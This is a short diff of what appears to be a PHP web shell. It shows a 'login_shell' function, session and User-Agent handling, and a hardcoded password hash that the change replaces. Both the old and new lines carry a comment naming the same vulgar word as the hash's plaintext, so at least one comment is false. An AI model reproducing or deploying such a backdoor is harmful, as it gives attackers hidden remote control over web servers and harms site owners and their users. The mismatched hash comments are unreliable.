@@ -40,7 +40,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
  session_destroy();
  echo "<script>window.location='?'</script>";
  }
-$password = "da48f6d3767fb7d180625a7006b1b637"; // md5 : memek
+$password = "9a5ff4525bef81806455804773c51121"; // md5 : memek
 function login_shell()
 {
 ?>
